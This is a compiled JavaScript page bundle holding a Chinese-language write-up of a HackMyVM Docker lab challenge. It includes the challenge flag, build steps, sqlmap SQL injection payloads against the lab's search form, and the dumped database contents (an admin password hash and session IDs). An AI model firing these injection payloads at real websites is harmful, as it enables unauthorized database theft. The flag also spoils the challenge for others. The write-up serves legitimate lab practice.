"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[6861],{1042:(e,n,a)=>{a.r(n),a.d(n,{assets:()=>l,contentTitle:()=>t,default:()=>p,frontMatter:()=>i,metadata:()=>c,toc:()=>d});var s=a(5893),r=a(1151);const i={},t="Docker - 059",c={id:"HackMyVM/Challenges/Docker/059",title:"Docker - 059",description:"created by || rick",source:"@site/docs/HackMyVM/Challenges/Docker/059.md",sourceDirName:"HackMyVM/Challenges/Docker",slug:"/HackMyVM/Challenges/Docker/059",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Challenges/Docker/059",draft:!1,unlisted:!1,editUrl:"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackMyVM/Challenges/Docker/059.md",tags:[],version:"current",frontMatter:{},sidebar:"HackMyVM_Sidebar",previous:{title:"Docker",permalink:"/Target-Machines-WriteUp/docs/category/docker-1"},next:{title:"Venus",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/HMVLabs/Venus/"}},l={},d=[{value:"flag",id:"flag",level:2},{value:"\u8fd0\u884c docker",id:"\u8fd0\u884c-docker",level:2},{value:"\u670d\u52a1\u63a2\u6d4b",id:"\u670d\u52a1\u63a2\u6d4b",level:2},{value:"\u6570\u636e\u5e93\u722c\u53d6",id:"\u6570\u636e\u5e93\u722c\u53d6",level:2}];function o(e){const n={admonition:"admonition",code:"code",h1:"h1",h2:"h2",img:"img",p:"p",pre:"pre",...(0,r.a)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.h1,{id:"docker---059",children:"Docker - 059"}),"\n",(0,s.jsxs)(n.admonition,{type:"note",children:[(0,s.jsx)(n.p,{children:"created by || rick"}),(0,s.jsx)(n.p,{children:"\u23f2\ufe0f Release Date // 2024-01-07"}),(0,s.jsx)(n.p,{children:"\ud83d\udc80 Solvers // 7"}),(0,s.jsx)(n.p,{children:"\ud83e\udde9 Type // docker"})]}),"\n",(0,s.jsx)(n.h2,{id:"flag",children:"flag"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"HMV{h1kinG_1s_s0_fUn}\n"})}),"\n",(0,s.jsx)(n.h2,{id:"\u8fd0\u884c-docker",children:"\u8fd0\u884c docker"}),"\n",(0,s.jsx)(n.p,{children:"\u5efa\u8bae\u5bf9 Dockerfile \u505a\u4e00\u5b9a\u4fee\u6539\uff0c\u4fbf\u4e8e\u52a0\u5feb\u955c\u50cf\u7684\u7f16\u8bd1"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-dockerfile",children:'FROM php:7.3-apache\n\n# apt \u66f4\u6362\u955c\u50cf\u6e90\uff0c\u5e76\u66f4\u65b0\u8f6f\u4ef6\u5305\u5217\u8868\u4fe1\u606f\nRUN sed -i \'s/deb.debian.org/mirrors.ustc.edu.cn/g\' /etc/apt/sources.list &&\n    sed -i \'s/security.debian.org/mirrors.ustc.edu.cn/g\' /etc/apt/sources.list\nRUN apt-get update\n\nRUN apt update && apt install -y mariadb-server mariadb-client && apt install -y supervisor\nRUN docker-php-ext-install mysqli\n\nCOPY . /var/www/html\nRUN chmod -R 0755 /var/www/html\n\nCOPY config/supervisord.conf /etc/supervisord.conf\n\nEXPOSE 80\n\nCMD ["/usr/bin/supervisord", "-c", "/etc/supervisord.conf"]\n\n'})}),"\n",(0,s.jsx)(n.p,{children:"\u7f16\u8bd1\u955c\u50cf"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"randark@developer:~/code/h1ker-main$ docker build -t h1ker .\n[+] Building 28.0s (13/13) FINISHED                                                                                                                                                                                         docker:default\n => [internal] load build definition from Dockerfile                                                                                                                                                                                  0.0s\n => => transferring dockerfile: 597B                                                                                                                                                                                                  0.0s\n => [internal] load metadata for docker.io/library/php:7.3-apache                                                                                                                                                                     3.0s\n => [internal] load .dockerignore                                                                                                                                                                                                     0.0s\n => => transferring context: 2B                                                                                                                                                                                                       0.0s\n => CACHED [1/8] FROM docker.io/library/php:7.3-apache@sha256:b9872cd287ef72bc17d45d713aa2742f3d3bcf2503fea2506fd93aa94995219f                                                                                                        0.0s\n => [internal] load build context                                                                                                                                                                                                     0.0s\n => => transferring context: 7.15kB                                                                                                                                                                                                   0.0s\n => [2/8] RUN sed -i 's/deb.debian.org/mirrors.ustc.edu.cn/g' /etc/apt/sources.list &&     sed -i 's/security.debian.org/mirrors.ustc.edu.cn/g' /etc/apt/sources.list                                                                 0.2s\n => [3/8] RUN apt-get update                                                                                                                                                                                                          2.1s\n => [4/8] RUN apt update && apt install -y mariadb-server mariadb-client && apt install -y supervisor                                                                                                                                12.7s\n => [5/8] RUN docker-php-ext-install mysqli                                                                                                                                                                                           8.8s\n => [6/8] COPY . /var/www/html                                                                                                                                                                                                        0.0s\n => [7/8] RUN chmod -R 0755 /var/www/html                                                                                                                                                                                             0.4s\n => [8/8] COPY config/supervisord.conf /etc/supervisord.conf                                                                                                                                                                          0.0s\n => exporting to image                                                                                                                                                                                                                0.6s\n => => exporting layers                                                                                                                                                                                                               0.6s\n => => writing image sha256:e7fc722a0803cff8b9db894d303f5cd07788e9f1de229c18d4cb31ec0b28d3c0                                                                                                                                          0.0s\n => => naming to docker.io/library/h1ker\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u7136\u540e\u57fa\u4e8e\u955c\u50cf\u542f\u52a8\u4e00\u4e2a\u5bb9\u5668"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:'randark@developer:~/code/h1ker-main$ docker run --name=h1ker -d -p 1337:80 h1ker\n1ffb5859282779260f56679b425fd0db47ce2d12cfc96cc5190fa4e0f6400960\nrandark@developer:~/code/h1ker-main$ docker ps\nCONTAINER ID   IMAGE         COMMAND                  CREATED          STATUS          PORTS                                             NAMES\n1ffb58592827   h1ker         "docker-php-entrypoi\u2026"   10 seconds ago   Up 10 seconds   0.0.0.0:1337->80/tcp, :::1337->80/tcp             h1ker\n'})}),"\n",(0,s.jsx)(n.p,{children:"\u6d4b\u8bd5\u670d\u52a1"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"access /",src:a(6963).Z+"",width:"1357",height:"837"})}),"\n",(0,s.jsx)(n.h2,{id:"\u670d\u52a1\u63a2\u6d4b",children:"\u670d\u52a1\u63a2\u6d4b"}),"\n",(0,s.jsx)(n.p,{children:"\u5728\u7f51\u7ad9\u9996\u9875\uff0c\u53d1\u73b0\u4e00\u4e2a\u641c\u7d22\u6846\uff0c\u6000\u7591\u5b58\u5728 sql \u6ce8\u5165\u653b\u51fb\u7684\u53ef\u80fd\u6027\uff0csqlmap \u81ea\u52a8\u5316\u6d4b\u8bd5\u770b\u770b"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $sqlmap -u http://192.168.163.135:1337/index.php --forms --batch\n......\nsqlmap identified the following injection point(s) with a total of 134 HTTP(s) requests:\n---\nParameter: search (POST)\n    Type: boolean-based blind\n    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)\n    Payload: search=BxPV' OR NOT 6515=6515#&submit=\n\n    Type: error-based\n    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)\n    Payload: search=BxPV' AND (SELECT 4812 FROM(SELECT COUNT(*),CONCAT(0x716b6a7671,(SELECT (ELT(4812=4812,1))),0x717a7a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- IQIK&submit=\n\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: search=BxPV' AND (SELECT 8834 FROM (SELECT(SLEEP(5)))dPAT)-- UhGJ&submit=\n\n    Type: UNION query\n    Title: MySQL UNION query (NULL) - 12 columns\n    Payload: search=BxPV' UNION ALL SELECT NULL,NULL,CONCAT(0x716b6a7671,0x666868444e456363506f657a4157695a7863667459516b4b424554574654667379544a784d475644,0x717a7a7171),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#&submit=\n---\n"})}),"\n",(0,s.jsx)(n.h2,{id:"\u6570\u636e\u5e93\u722c\u53d6",children:"\u6570\u636e\u5e93\u722c\u53d6"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",metastring:'title="dbs"',children:"[*] aerocms\n[*] information_schema\n[*] mysql\n[*] performance_schema\n"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",metastring:'title="aerocms - tables"',children:"Database: aerocms\n[5 tables]\n+--------------+\n| categories   |\n| comments     |\n| posts        |\n| users        |\n| users_online |\n+--------------+\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5c06\u8868\u4e2d\u7684\u6240\u6709\u6570\u636e\u722c\u53d6\u4e0b\u6765"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",metastring:'title="aerocms - tables - data"',children:"Database: aerocms\nTable: users\n[1 entry]\n+---------+--------------------------------------------------------------+-------------------------------+----------+-----------+-------------------+------------+---------------+----------------+\n| user_id | password                                                     | randSalt                      | username | user_role | user_email        | user_image | user_lastname | user_firstname |\n+---------+--------------------------------------------------------------+-------------------------------+----------+-----------+-------------------+------------+---------------+----------------+\n| Admin   | $2a$12$M8KMzrASFLbF.tEyC5bGRebyfk/.wyQn0yt39GbZi8TfixfgKo9Zm | $2y$10$iusesomecrazystrings22 | <blank>  | <blank>   | admin@example.net | admin      | <blank>       | 1              |\n+---------+--------------------------------------------------------------+-------------------------------+----------+-----------+-------------------+------------+---------------+----------------+\n\nDatabase: aerocms\nTable: users_online\n[23 entries]\n+----+------------+----------------------------+\n| id | time       | session                    |\n+----+------------+----------------------------+\n| 1  | 1525603889 | pf2ovmbhtdn7dtrli83rjetlv6 |\n| 2  | 1525600070 | g4eaojs9lup5uoi9clh0a7dlj2 |\n| 3  | 1525600816 | u5b26mae8k9upvdf0loiv4qh80 |\n| 4  | 1525603284 | 7dg0jaipc161dirait3omf4fk0 |\n| 5  | 1525603543 | p9e0jf3ama3n4hvbp6eknime52 |\n| 6  | 1525753912 | hqhn3mcl82dg0t12i01do5gkp2 |\n| 7  | 1525837122 | krkd2v356t3jv5k5d2v6sa4om6 |\n| 8  | 1525861608 | 04nli9lc34bfm8qnnbn0s47t63 |\n| 9  | 1525925780 | drpe2pej7n3glgdkgltdu59ft1 |\n| 10 | 1526038120 | nvqkpc95pdac56qmctcrm89jh0 |\n| 11 | 1526200326 | 66isnml6mnu741n3r5q9s5m956 |\n| 12 | 1526219068 | jdicp9b8bbek3opi4b7970lo02 |\n| 13 | 1526268404 | 8o8u5o0gglhrok5fjobnrll0s0 |\n| 14 | 1526273159 | ins7sdp4b5gbb079c4kv5hd734 |\n| 15 | 1526306904 | rmtl5qd6uo6nadc4ql7fifcr47 |\n| 16 | 1526312831 | 7d1vov1qav2kgbi18hrcgtcmd2 |\n| 17 | 1526355967 | 7sjflm0u8i7qonakjs6341jdl1 |\n| 18 | 1526395857 | 32hpoav8ksrhvi4qd7f5iisdh7 |\n| 19 | 1526441933 | b51ki4eoffu1a3suqagcjcb662 |\n| 20 | 1633389690 | 05t149k9ossbtvs3l0lb24u9up |\n| 21 | 1633405608 | 5kavrpik2i0gl4cdskfif3c9gj |\n| 22 | 1633487781 | 6ek6d59pvjf8a8a5dr7b7ivu5r |\n| 23 | 1633487237 | 56sf778beevhfl7c95mhtvs1km |\n+----+------------+----------------------------+\n\nDatabase: aerocms\nTable: categories\n[2 entries]\n+--------+---------------+\n| cat_id | cat_title     |\n+--------+---------------+\n| 1      | Default       |\n| 2      | Hiking Trails |\n+--------+---------------+\n"})}),"\n",(0,s.jsx)(n.admonition,{type:"warning",children:(0,s.jsx)(n.p,{children:"\u73af\u5883\u6709\u70b9\u95ee\u9898\uff0c\u6ca1\u6709\u529e\u6cd5\u8fdb\u5165\u540e\u53f0\uff0c\u4ece\u800c\u6ca1\u6709\u529e\u6cd5\u4e0a\u4f20\u6587\u4ef6\u5f62\u6210 webshell\uff0c\u4e5f\u6ca1\u6709\u529e\u6cd5\u901a\u8fc7 sqlmap \u5f62\u6210 webshell"})})]})}function p(e={}){const{wrapper:n}={...(0,r.a)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(o,{...e})}):o(e)}},6963:(e,n,a)=>{a.d(n,{Z:()=>s});const s=a.p+"assets/images/image_20240210-111012-32ec406f5fae2fe200c8575ddc406b42.png"},1151:(e,n,a)=>{a.d(n,{Z:()=>c,a:()=>t});var s=a(7294);const r={},i=s.createContext(r);function t(e){const n=s.useContext(i);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:t(e.components),s.createElement(i.Provider,{value:n},e.children)}}}]);